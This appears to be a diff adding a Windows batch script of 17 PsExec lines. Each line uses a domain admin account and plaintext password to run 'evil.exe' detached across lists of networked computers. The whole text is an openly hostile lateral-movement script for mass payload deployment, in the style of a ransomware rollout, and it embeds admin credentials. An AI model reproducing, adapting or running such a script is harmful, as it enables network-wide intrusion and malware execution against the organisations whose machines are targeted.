@@ -1,0 +1,17 @@
+start PsExec.exe -d @C:\share$\comp1.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp2.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp3.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp4.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp5.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp6.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp7.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp8.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp9.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp10.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp11.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp12.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp13.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp14.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp15.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp16.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comp17.txt -u MAKAROVKA\Barishnikov-admin> -p “Vzlom-2” cmd /c c:\windows\temp\evil.exe
